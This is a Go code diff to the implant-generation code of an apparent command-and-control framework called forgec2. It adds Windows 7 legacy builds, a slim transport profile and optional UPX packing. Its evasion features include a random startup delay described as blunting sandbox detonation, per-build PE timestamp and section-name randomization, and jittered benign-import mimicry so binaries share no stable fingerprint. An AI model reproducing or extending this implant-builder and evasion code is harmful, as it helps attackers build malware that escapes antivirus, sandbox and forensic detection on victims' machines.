@@ -4,6 +4,7 @@ import (
 	"archive/zip"
 	"bytes"
 	"context"
+	"crypto/rand"
 	"crypto/sha256"
 	"embed"
 	"encoding/base64"
@@ -49,6 +50,9 @@ var payloadFS embed.FS
 
 //go:embed icons/*.ico
 var iconsFS embed.FS
+
+//go:embed win7shim
+var win7shimFS embed.FS
 
 // ttlCache memoizes a resolved string (e.g. a toolchain path) but refreshes it
 // after a TTL elapses. A one-shot sync.Once would never pick up environment
@@ -107,6 +111,17 @@ func goModuleEnv(extra ...string) []string {
 		return env
 	}
 	return append(env, extra...)
+}
+
+// goToolchainEnv wraps goModuleEnv and pins GOTOOLCHAIN for legacy
+// (Win7) builds so the stock toolchain auto-fetches go1.20.14 on first
+// use. Non-legacy builds keep the host default untouched.
+func goToolchainEnv(win7 bool, extra ...string) []string {
+	env := goModuleEnv(extra...)
+	if win7 {
+		env = replaceOrAppendEnv(env, "GOTOOLCHAIN", win7Toolchain)
+	}
+	return env
 }
 
 func replaceOrAppendEnv(env []string, key, value string) []string {
@@ -486,11 +501,11 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) (str
 // go build argv) keeps them out of the build process command line (B2). The file
 // lives only inside the throwaway build directory and is removed with it.
 //
-// The filename must sort BEFORE agent.go: Go runs a package's init() functions
-// in source-file name order, and agent.go's init() calls loadConfigBlob() which
-// reads ConfigBlob/SConfigKey. A name like zz_config_inject.go would run last,
-// so the blob would still be empty when loadConfigBlob() executes and every
-// build would silently fall back to build-time defaults.
+// The filename is randomized per build with an "aa_" prefix: Go runs a
+// package's init() functions in source-file name order, and agent.go's init()
+// calls loadConfigBlob() which reads ConfigBlob/SConfigKey. Any "aa_*" name
+// sorts before "agent.go" ("aa" < "ag"), so the blob is always set before
+// loadConfigBlob() executes, while the exact filename varies per build.
 func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
 	if configBlob == "" && sConfigKey == "" {
 		return nil
@@ -503,7 +518,11 @@ func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
 		src += "\tSConfigKey = " + strconv.Quote(sConfigKey) + "\n"
 	}
 	src += "}\n"
-	return os.WriteFile(filepath.Join(workDir, "aa_config_inject.go"), []byte(src), 0644)
+	name := "aa_config_inject.go"
+	if b := make([]byte, 3); func() bool { _, err := rand.Read(b); return err == nil }() {
+		name = "aa_" + hex.EncodeToString(b) + "_inject.go"
+	}
+	return os.WriteFile(filepath.Join(workDir, name), []byte(src), 0644)
 }
 
 // selfCheckPlaceholder is the 64-'0' hex string injected at build time for the
@@ -542,18 +561,165 @@ func patchSelfCheckHash(outPath string) error {
 	return nil
 }
 
-// buildGoMod generates a go.mod file for the target OS.
-func buildGoMod(goos string, isDLL bool) string {
-	replaceDir := forgeC2ModuleReplace()
+// buildGoMod generates a go.mod file for the target OS. When slim is set
+// (light/http-only profile) the grpc/quic/wss stacks are dropped alongside
+// their exclusive dependencies; utls stays because it is the shared TLS
+// fingerprint layer for HTTPS/DoT/mTLS, and sqlite stays for credential
+// recovery. Measured saving on windows/amd64: ~23.3MB -> ~17.0MB.
+// win7Toolchain pins the language version fetched for legacy Windows
+// targets. The stock toolchain auto-downloads it on first use (needs
+// network once); GOTOOLCHAIN is set per-build so the host default is
+// untouched. garble is incompatible with this line and rejected separately.
+const win7Toolchain = "go1.20.14"
 
+// win7Pins are go1.20-compatible dependency versions for legacy builds.
+// Current pins require newer Go (fail fast with "requires go >=" otherwise),
+// so the Win7 branch repins the whole module set. Slim is forced on (see
+// NormalizeImplantConfig), which keeps grpc/quic/gorilla out entirely.
+//
+// Beyond the six direct modules this also pins the modernc transitive
+// closure: without it MVS lifts e.g. klauspost/compress to the modern line
+// (required by the parent module) and go1.20 fails compiling it.
+func win7Pins() []string {
+	return []string{
+		"\tgolang.org/x/sys v0.19.0",
+		"\tgolang.org/x/crypto v0.22.0",
+		"\tgolang.org/x/net v0.24.0",
+		"\tgolang.org/x/text v0.14.0",
+		"\tgithub.com/refraction-networking/utls v1.5.4",
+		// quic-go is only pulled for utls's QUIC transport-parameter helper
+		// (quicvarint); pin the era version utls itself requires.
+		"\tgithub.com/quic-go/quic-go v0.37.4",
+		"\tgithub.com/Microsoft/go-winio v0.6.1",
+		"\tmodernc.org/sqlite v1.21.0",
+		"\tmodernc.org/libc v1.22.3",
+		"\tmodernc.org/mathutil v1.5.0",
+		"\tmodernc.org/memory v1.5.0",
+		"\tgithub.com/klauspost/compress v1.15.9",
+		"\tgithub.com/google/uuid v1.3.0",
+		"\tgithub.com/dustin/go-humanize v1.0.0",
+		"\tgithub.com/mattn/go-isatty v0.0.16",
+		"\tlukechampine.com/uint128 v1.2.0",
+		"\tgithub.com/remyoudompheng/bigfft v0.0.0-20230129092748-24d4a6f8daec",
+		// pkg/protocol + pkg/encoding use cbor/msgpack; pin era lines or
+		// MVS lifts them past go1.20 (same mechanism as klauspost above).
+		"\tgithub.com/fxamacker/cbor/v2 v2.5.0",
+		"\tgithub.com/vmihailenco/msgpack/v5 v5.3.5",
+		"\tgithub.com/vmihailenco/tagparser/v2 v2.0.0",
+		"\tgithub.com/x448/float16 v0.8.4",
+	}
+}
+
+// win7ShimPkgs maps embedded mirror subdirs to the import paths they
+// satisfy inside the stub parent module.
+var win7ShimPkgs = []struct{ dir, importPath string }{
+	{"crypto", "internal/crypto"},
+	{"protocol", "pkg/protocol"},
+	{"encoding", "pkg/encoding"},
+}
+
+// win7ShimModulePath is the stub module location inside the temp build dir,
+// mirrored by the replace rewrite in materializeWin7Shim.
+const win7ShimModulePath = "win7shimroot/github.com/forgec2/forgec2"
+
+// materializeWin7Shim vendors the go1.20-clean parent packages
+// (internal/crypto, pkg/protocol, pkg/encoding) from the embedded mirror
+// into a stub module and repoints the agent go.mod's parent replace at it.
+// Without this, go1.20 refuses to compile those packages out of the go-1.25
+// main module ("cannot compile Go 1.25 code") even though the sources
+// themselves are language-compatible (verified by isolated builds).
+func materializeWin7Shim(buildDir string) error {
+	stubRoot := filepath.Join(buildDir, win7ShimModulePath)
+	for _, pkg := range win7ShimPkgs {
+		entries, err := win7shimFS.ReadDir("win7shim/" + pkg.dir)
+		if err != nil {
+			return fmt.Errorf("win7shim mirror missing %s: run node scripts/sync-win7shim.mjs: %w", pkg.dir, err)
+		}
+		dstDir := filepath.Join(stubRoot, filepath.FromSlash(pkg.importPath))
+		if err := os.MkdirAll(dstDir, 0o750); err != nil {
+			return err
+		}
+		for _, e := range entries {
+			if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") {
+				continue
+			}
+			data, err := win7shimFS.ReadFile("win7shim/" + pkg.dir + "/" + e.Name())
+			if err != nil {
+				return err
+			}
+			if err := os.WriteFile(filepath.Join(dstDir, e.Name()), data, 0o644); err != nil {
+				return err
+			}
+		}
+	}
+	if err := os.WriteFile(filepath.Join(stubRoot, "go.mod"), []byte("module github.com/forgec2/forgec2\n\ngo 1.20\n"), 0o644); err != nil {
+		return err
+	}
+	// Repoint the parent replace at the stub. forgeC2ModuleReplace emits a
+	// single `replace github.com/forgec2/forgec2 => <repodir>` line.
+	gomodPath := filepath.Join(buildDir, "go.mod")
+	raw, err := os.ReadFile(gomodPath)
+	if err != nil {
+		return err
+	}
+	lines := strings.Split(string(raw), "\n")
+	rewrote := false
+	for i, ln := range lines {
+		if strings.HasPrefix(strings.TrimSpace(ln), "replace github.com/forgec2/forgec2 =>") {
+			lines[i] = "replace github.com/forgec2/forgec2 => ./" + win7ShimModulePath
+			rewrote = true
+		}
+	}
+	if !rewrote {
+		return fmt.Errorf("win7shim: parent replace line not found in generated go.mod")
+	}
+	return os.WriteFile(gomodPath, []byte(strings.Join(lines, "\n")), 0o644)
+}
+
+// buildGoModWin7 emits the legacy module file for Win7/2008R2 targets:
+// go 1.20 directive plus fully repinned dependencies. Slim is forced on
+// for Win7 (see NormalizeImplantConfig), so grpc/quic never appear here.
+//
+// The replace block is load-bearing, not cosmetic: the agent imports
+// github.com/forgec2/forgec2/pkg/*, whose parent module requires MODERN
+// dependency versions — without replaces, MVS would lift every pin back
+// to the modern line and go1.20 would fail with "requires go >=".
+func buildGoModWin7() string {
+	replaceDir := forgeC2ModuleReplace()
+	deps := append([]string{}, win7Pins()...)
+	base := "module agent\n\ngo 1.20\n\nrequire (\n"
+	base += strings.Join(deps, "\n") + "\n)\n"
+	base += replaceDir
+	for _, dep := range win7Pins() {
+		fields := strings.Fields(dep)
+		if len(fields) != 2 {
+			continue
+		}
+		base += "replace " + fields[0] + " => " + fields[0] + " " + fields[1] + "\n"
+	}
+	return base
+}
+
+func buildGoMod(goos string, isDLL bool, slim bool, win7 bool) string {
+	replaceDir := forgeC2ModuleReplace()
+	if win7 {
+		return buildGoModWin7()
+	}
 	deps := []string{}
 	deps = append(deps, "\tgolang.org/x/sys v0.46.0")
 	deps = append(deps, "\tgolang.org/x/crypto v0.53.0")
 
-	if !isDLL {
+	if !isDLL && !slim {
 		deps = append(deps, "\tgolang.org/x/net v0.56.0")
 		deps = append(deps, "\tgithub.com/gorilla/websocket v1.5.3")
 		deps = append(deps, "\tgithub.com/quic-go/quic-go v0.54.1")
+		deps = append(deps, "\tgithub.com/refraction-networking/utls v1.6.7")
+	}
+
+	if !isDLL && slim {
+		// Slim keeps x/net (h2c/icmp transports) and utls (shared JA3
+		// layer for HTTPS/DoT/mTLS); only the grpc/quic/wss stacks go.
+		deps = append(deps, "\tgolang.org/x/net v0.56.0")
 		deps = append(deps, "\tgithub.com/refraction-networking/utls v1.6.7")
 	}
 
@@ -562,7 +728,7 @@ func buildGoMod(goos string, isDLL bool) string {
 		deps = append(deps, "\tmodernc.org/sqlite v1.52.0")
 	}
 
-	if goos == "windows" && !isDLL {
+	if goos == "windows" && !isDLL && !slim {
 		deps = append(deps, "\tgoogle.golang.org/grpc v1.82.0")
 		deps = append(deps, "\tnhooyr.io/websocket v1.8.17")
 	}
@@ -751,6 +917,11 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	if cfg.Protocol == "" {
 		cfg.Protocol = "http"
 	}
+	// Win7Compat forces the light profile: fewer dependencies to repin for
+	// the go1.20 line, and grpc/quic never worked on those targets anyway.
+	if cfg.Win7Compat {
+		cfg.Slim = true
+	}
 
 	profile := loadMalleableProfile(cfg.Profile, dataDir)
 	cfg.BeaconURI = profile.BeaconURI
@@ -834,6 +1005,22 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	}
 	if cfg.ContentLengthJitter == 0 && profile.ContentLengthJitter > 0 {
 		cfg.ContentLengthJitter = profile.ContentLengthJitter
+	}
+	// Startup delay window: sanitize (negatives off, cap 600s, min<=max).
+	if cfg.StartDelayMin < 0 {
+		cfg.StartDelayMin = 0
+	}
+	if cfg.StartDelayMax < 0 {
+		cfg.StartDelayMax = 0
+	}
+	if cfg.StartDelayMin > 600 {
+		cfg.StartDelayMin = 600
+	}
+	if cfg.StartDelayMax > 600 {
+		cfg.StartDelayMax = 600
+	}
+	if cfg.StartDelayMax > 0 && cfg.StartDelayMin > cfg.StartDelayMax {
+		cfg.StartDelayMin = cfg.StartDelayMax
 	}
 	// Prefer first v2 URI as primary when profile sets multi-URI.
 	if len(cfg.BeaconURIs) > 0 && cfg.BeaconURIs[0] != "" {
@@ -1264,6 +1451,22 @@ type ImplantConfig struct {
 	// body length varies per beacon (0=disabled). The server strips the
 	// 8-byte length prefix on inbound; see stripBodyPadding/padBeaconBody.
 	ContentLengthJitter int
+	// Startup delay window (seconds) before the first beacon: the agent
+	// sleeps a per-boot random duration in [StartDelayMin, StartDelayMax] to
+	// blunt sandbox detonation timelines. 0/0 = disabled. Capped at 600s.
+	StartDelayMin int
+	StartDelayMax int
+	// Slim builds the light/http-only profile: the grpc/quic/wss transports
+	// are compiled out (stubs report plainly at runtime), cutting ~30% off
+	// the binary. Incompatible with BeaconTransport grpc/quic/wss.
+	Slim bool
+	// UPX runs an optional post-build UPX --lzma pass (exe/elf only).
+	// Missing upx binary = skip, never a build failure.
+	UPX bool
+	// Win7Compat targets Windows 7 / Server 2008 R2: the build switches to
+	// the go1.20.14 toolchain (auto-downloaded once, needs network) with
+	// repinned dependencies. Forces Slim on and forbids garble obfuscation.
+	Win7Compat bool
 	// Working hours
 	WorkingStart string // HH:MM start of working hours (empty = disabled)
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
@@ -1343,10 +1546,145 @@ func forgeC2ModuleReplace() string {
 	return ""
 }
 
+// maybeCompressUPX runs an optional UPX pass over a freshly built implant.
+// It only acts when cfg.UPX is set and format is exe or elf (UPX Mach-O and
+// c-shared DLL support is unreliable, so those are skipped silently).
+// A missing upx binary is a skip, not an error — unlike garble, UPX is pure
+// size optimization with no security promise attached. A failed UPX run
+// restores the pre-compression bytes and fails loudly rather than shipping
+// a possibly corrupt binary. Must run BEFORE patchSelfCheckHash so the
+// integrity hash covers the final bytes.
+func maybeCompressUPX(outPath string, cfg ImplantConfig, format string) error {
+	if !cfg.UPX {
+		return nil
+	}
+	if format != "exe" && format != "elf" {
+		fmt.Printf("upx: skipping unsupported format %q (exe/elf only)\n", format)
+		return nil
+	}
+	upxPath, err := exec.LookPath("upx")
+	if err != nil {
+		fmt.Printf("upx: binary not found in PATH, skipping compression (install UPX to enable)\n")
+		return nil
+	}
+	orig, err := os.ReadFile(outPath)
+	if err != nil {
+		return fmt.Errorf("upx: read for backup: %w", err)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, upxPath, "--lzma", "-q", outPath)
+	cmd.Env = goModuleEnv()
+	var stderr bytes.Buffer
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		_ = os.WriteFile(outPath, orig, 0644)
+		return fmt.Errorf("upx compression failed (original restored): %w\n%s", err, stderr.String())
+	}
+	compressed, err := os.ReadFile(outPath)
+	if err != nil || len(compressed) == 0 || len(compressed) >= len(orig) {
+		_ = os.WriteFile(outPath, orig, 0644)
+		if err == nil && len(compressed) >= len(orig) {
+			fmt.Printf("upx: no size gain (%d -> %d bytes), keeping original\n", len(orig), len(compressed))
+			return nil
+		}
+		return fmt.Errorf("upx: compressed output invalid, original restored")
+	}
+	fmt.Printf("upx: compressed %d -> %d bytes\n", len(orig), len(compressed))
+	return nil
+}
+
+// finalizePE applies the full per-build PE forensic randomization pipeline:
+// artifact stripping, timestamp handling, section-name randomization and
+// benign-import mimicry. Every step uses fresh crypto/rand material so two
+// binaries built from the same config never share PE headers. Callers must
+// run patchSelfCheckHash AFTER this so the integrity hash covers final bytes.
+func finalizePE(outPath string, cfg ImplantConfig, goarch string) {
+	switch cfg.PETimestampMode {
+	case "keep":
+		// keep original Go timestamp
+	default:
+		stripPEArtifacts(outPath)
+		if cfg.PETimestampMode == "random" {
+			if ts, err := GenerateTimestamp(TSRandom, ""); err == nil {
+				if data, err := os.ReadFile(outPath); err == nil {
+					ApplyTimestamp(data, ts)
+					_ = os.WriteFile(outPath, data, 0644)
+				}
+			}
+		}
+	}
+	// Optional PE section name randomization
+	if cfg.PESectionMode == "random" {
+		if data, err := os.ReadFile(outPath); err == nil {
+			cfgSec := PESectionConfig{
+				Text:  "." + randomHex(3),
+				Data:  "." + randomHex(3),
+				Rdata: "." + randomHex(3),
+				Reloc: "." + randomHex(3),
+			}
+			ApplyPESectionNames(data, cfgSec)
+			_ = os.WriteFile(outPath, data, 0644)
+		}
+	}
+	// Optional benign import mimic with per-build subset jitter: even in
+	// kernel32+user32 mode we randomly drop to kernel32-only for some builds
+	// so the import table is not a stable fingerprint.
+	if cfg.PEImportMode != "" && cfg.PEImportMode != "none" {
+		if data, err := os.ReadFile(outPath); err == nil {
+			var dlls []string
+			if cfg.PEImportMode == "kernel32" {
+				dlls = []string{"kernel32.dll"}
+			} else {
+				dlls = []string{"kernel32.dll", "user32.dll"}
+				if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
+					if b[0]%2 == 0 {
+						dlls = []string{"kernel32.dll"}
+					}
+				}
+			}
+			if out, err := AddBenignImports(data, dlls); err == nil {
+				_ = os.WriteFile(outPath, out, 0644)
+			}
+		}
+	}
+}
+
+// slimTransportConflict rejects light builds whose selected transport was
+// compiled out. Failing here beats shipping an implant that can never beacon.
+func slimTransportConflict(cfg *ImplantConfig) error {
+	if !cfg.Slim {
+		return nil
+	}
+	switch strings.ToLower(strings.TrimSpace(cfg.BeaconTransport)) {
+	case "grpc", "quic", "wss":
+		return fmt.Errorf("slim (light) build excludes the %q transport: pick http/tcp/dns/icmp/ssh/mtls/h2c or disable slim", cfg.BeaconTransport)
+	}
+	return nil
+}
+
+// win7CompatConflict rejects option combinations the legacy toolchain
+// cannot honor. Failing here beats shipping a subtly broken implant.
+func win7CompatConflict(cfg *ImplantConfig) error {
+	if !cfg.Win7Compat {
+		return nil
+	}
+	if cfg.Obfuscate {
+		return fmt.Errorf("win7compat forbids garble obfuscation (garble requires a modern Go toolchain)")
+	}
+	return nil
+}
+
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
 func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if err := win7CompatConflict(&cfg); err != nil {
+		return "", err
+	}
+	if err := slimTransportConflict(&cfg); err != nil {
+		return "", err
+	}
 
 	// Create temp build dir
 	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
@@ -1363,15 +1701,20 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	}
 
 	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
-	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
+	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
 		return "", err
 	}
 
 	// go.mod with required external dependencies
-	goMod := buildGoMod("windows", false)
+	goMod := buildGoMod("windows", false, cfg.Slim, cfg.Win7Compat)
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
+	}
+	if cfg.Win7Compat {
+		if err := materializeWin7Shim(tmpDir); err != nil {
+			return "", err
+		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
@@ -1438,7 +1781,7 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	if goCmd == "" {
 		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
-	if err := runGoModTidy(goCmd, tmpDir); err != nil {
+	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
@@ -1447,51 +1790,17 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
-	// Post-build: PE forensic handling per user choice
-	switch cfg.PETimestampMode {
-	case "keep":
-		// keep original Go timestamp
-	default:
-		stripPEArtifacts(outPath)
-		if cfg.PETimestampMode == "random" {
-			if ts, err := GenerateTimestamp(TSRandom, ""); err == nil {
-				if data, err := os.ReadFile(outPath); err == nil {
-					ApplyTimestamp(data, ts)
-					_ = os.WriteFile(outPath, data, 0644)
-				}
-			}
-		}
-	}
-	// Optional PE section name randomization
-	if cfg.PESectionMode == "random" {
-		if data, err := os.ReadFile(outPath); err == nil {
-			cfgSec := PESectionConfig{
-				Text:  "." + randomHex(3),
-				Data:  "." + randomHex(3),
-				Rdata: "." + randomHex(3),
-				Reloc: "." + randomHex(3),
-			}
-			ApplyPESectionNames(data, cfgSec)
-			_ = os.WriteFile(outPath, data, 0644)
-		}
-	}
-	// Optional benign import mimic
-	if cfg.PEImportMode != "" && cfg.PEImportMode != "none" {
-		if data, err := os.ReadFile(outPath); err == nil {
-			var dlls []string
-			if cfg.PEImportMode == "kernel32" {
-				dlls = []string{"kernel32.dll"}
-			} else {
-				dlls = []string{"kernel32.dll", "user32.dll"}
-			}
-			if out, err := AddBenignImports(data, dlls); err == nil {
-				_ = os.WriteFile(outPath, out, 0644)
-			}
-		}
+	// Post-build: full per-build PE forensic randomization (must run before
+	// self-check patch so the hash covers final bytes).
+	finalizePE(outPath, cfg, goarch)
+
+	// Optional UPX compression (also before the self-check patch).
+	if err := maybeCompressUPX(outPath, cfg, "exe"); err != nil {
+		return "", err
 	}
 
 	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
@@ -1616,9 +1925,76 @@ func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
 	return outPath, nil
 }
 
+// slimExcludedTransports are agent sources dropped for light/http-only
+// builds. utls stays: it is the shared JA3 layer for HTTPS/DoT/mTLS, and
+// transport_utls.go's grpc-only tail (utlsCreds) is stripped separately by
+// stripUTLSCreds. agent.go's dispatch keeps compiling via slimTransportStubs.
+var slimExcludedTransports = map[string]bool{
+	"transport_grpc.go": true,
+	"transport_quic.go": true,
+	"transport_wss.go":  true,
+}
+
+// slimTransportStubs replaces the excluded transports' entry points. A stubbed
+// transport behaves like an unreachable endpoint (nil response, debug log) so
+// failover simply moves on instead of wedging the beacon loop.
+const slimTransportStubs = `package main
+
+func sendGRPCBeacon(body []byte) []byte {
+	if Debug {
+		println("[!] grpc transport not compiled into this light build")
+	}
+	return nil
+}
+
+func sendQUICBeacon(body []byte) []byte {
+	if Debug {
+		println("[!] quic transport not compiled into this light build")
+	}
+	return nil
+}
+
+func sendWSSBeacon(body []byte) []byte {
+	if Debug {
+		println("[!] wss transport not compiled into this light build")
+	}
+	return nil
+}
+`
+
+// utlsCredsMarker starts transport_utls.go's grpc-only tail, which imports
+// google.golang.org/grpc. Slim builds cut everything from this marker.
+const utlsCredsMarker = "// utlsCreds implements"
+
+// stripUTLSCreds removes the grpc-dependent tail and import from a copy of
+// transport_utls.go source. It errors loudly (failing the build) when the
+// marker or import moves, so upstream refactors cannot silently reintroduce
+// the grpc dependency into slim builds.
+func stripUTLSCreds(src []byte) ([]byte, error) {
+	text := string(src)
+	imp := "\t\"google.golang.org/grpc/credentials\"\n"
+	if !strings.Contains(text, imp) {
+		return nil, fmt.Errorf("slim: grpc credentials import not found in transport_utls.go (refactor?)")
+	}
+	text = strings.Replace(text, imp, "", 1)
+	idx := strings.Index(text, utlsCredsMarker)
+	if idx < 0 {
+		return nil, fmt.Errorf("slim: utlsCreds marker not found in transport_utls.go (refactor?)")
+	}
+	text = text[:idx]
+	// The grpc tail was the only user of fmt in this file; drop the import
+	// so the slim copy still compiles (verified by TestSmokeSlimWindowsEXE).
+	if strings.Contains(text, "\t\"fmt\"\n") && !strings.Contains(text, "fmt.") {
+		text = strings.Replace(text, "\t\"fmt\"\n", "", 1)
+	}
+	return []byte(text), nil
+}
+
 // extractAgentSources writes ALL Go agent source files from the embedded FS
 // into the temp build directory. This enables cross-platform builds (windows/linux).
-func extractAgentSources(efs embed.FS, dir string) error {
+// When slim is set (light profile), the grpc/quic/wss transports are excluded
+// and replaced by stubs (see slimTransportStubs), cutting ~30% off the binary.
+func extractAgentSources(efs embed.FS, dir string, slim bool) error {
 	entries, err := efs.ReadDir("agent")
 	if err != nil {
 		return fmt.Errorf("failed to read embedded agent dir: %w", err)
@@ -1626,6 +2002,9 @@ func extractAgentSources(efs embed.FS, dir string) error {
 	hasAgentGo := false
 	for _, entry := range entries {
 		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
+			continue
+		}
+		if slim && slimExcludedTransports[entry.Name()] {
 			continue
 		}
 		// Platform-specific sources use go:build tags; include all .go files so links resolve.
@@ -1636,12 +2015,22 @@ func extractAgentSources(efs embed.FS, dir string) error {
 		if err != nil {
 			return fmt.Errorf("failed to read embedded agent/%s: %w", entry.Name(), err)
 		}
+		if slim && entry.Name() == "transport_utls.go" {
+			if data, err = stripUTLSCreds(data); err != nil {
+				return err
+			}
+		}
 		if err := os.WriteFile(filepath.Join(dir, entry.Name()), data, 0644); err != nil {
 			return err
 		}
 	}
 	if !hasAgentGo {
 		return fmt.Errorf("embedded agent directory missing agent.go")
+	}
+	if slim {
+		if err := os.WriteFile(filepath.Join(dir, "transport_slim_stubs.go"), []byte(slimTransportStubs), 0644); err != nil {
+			return err
+		}
 	}
 
 	// Every agent build gets a freshly randomized string table (fresh XOR keys
@@ -1666,12 +2055,12 @@ func injectRandomizedStrxor(buildDir string) error {
 // runGoModTidy resolves go.sum entries for the temp build module. Every
 // generate path must run this before `go build`; without it cross-builds
 // fail with "missing go.sum entry" for OS-specific transitive imports.
-func runGoModTidy(goCmd, workDir string) error {
+func runGoModTidy(goCmd, workDir string, win7 bool) error {
 	ctx, cancel := context.WithTimeout(context.Background(), buildTidyTimeout)
 	defer cancel()
 	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
 	tidyCmd.Dir = workDir
-	tidyCmd.Env = goModuleEnv()
+	tidyCmd.Env = goToolchainEnv(win7)
 	var tidyOut, tidyErr bytes.Buffer
 	tidyCmd.Stdout = &tidyOut
 	tidyCmd.Stderr = &tidyErr
@@ -1712,7 +2101,7 @@ func scrubBuildLog(output, ldflags string) string {
 // When obfuscate is requested, garble is REQUIRED: falling back to a plain
 // build would silently produce an un-obfuscated implant (a false security
 // promise), so a missing/broken garble fails the build instead.
-func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string) error {
+func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string, win7 bool) error {
 	ctx, cancel := context.WithTimeout(context.Background(), buildCompileTimeout)
 	defer cancel()
 	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey); err != nil {
@@ -1746,7 +2135,7 @@ func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, g
 		".",
 	)...)
 	cmd.Dir = workDir
-	cmd.Env = goModuleEnv("GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+	cmd.Env = goToolchainEnv(win7, "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
 	var stderr bytes.Buffer
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
@@ -1919,6 +2308,12 @@ func validatePE(path string, machine uint16) error {
 func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if err := win7CompatConflict(&cfg); err != nil {
+		return "", err
+	}
+	if err := slimTransportConflict(&cfg); err != nil {
+		return "", err
+	}
 	if cfg.UserAgent == defaultWindowsUA {
 		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 	}
@@ -1935,13 +2330,18 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 		}
 	}
 
-	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
+	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
 		return "", err
 	}
 
-	goMod := buildGoMod("linux", false)
+	goMod := buildGoMod("linux", false, cfg.Slim, cfg.Win7Compat)
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
+	}
+	if cfg.Win7Compat {
+		if err := materializeWin7Shim(tmpDir); err != nil {
+			return "", err
+		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "linux")
@@ -1970,14 +2370,19 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 	if goCmd == "" {
 		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
-	if err := runGoModTidy(goCmd, tmpDir); err != nil {
+	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 	goarch, err := resolveBuildArch("linux", cfg.Architecture)
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch, blob, sKey); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch, blob, sKey, cfg.Win7Compat); err != nil {
+		return "", err
+	}
+
+	// Optional UPX compression (before the self-check patch below).
+	if err := maybeCompressUPX(outPath, cfg, "elf"); err != nil {
 		return "", err
 	}
 
@@ -1998,6 +2403,12 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if err := win7CompatConflict(&cfg); err != nil {
+		return "", err
+	}
+	if err := slimTransportConflict(&cfg); err != nil {
+		return "", err
+	}
 	if cfg.UserAgent == defaultWindowsUA {
 		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
 	}
@@ -2014,13 +2425,18 @@ func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 		}
 	}
 
-	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
+	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
 		return "", err
 	}
 
-	goMod := buildGoMod("darwin", false)
+	goMod := buildGoMod("darwin", false, cfg.Slim, cfg.Win7Compat)
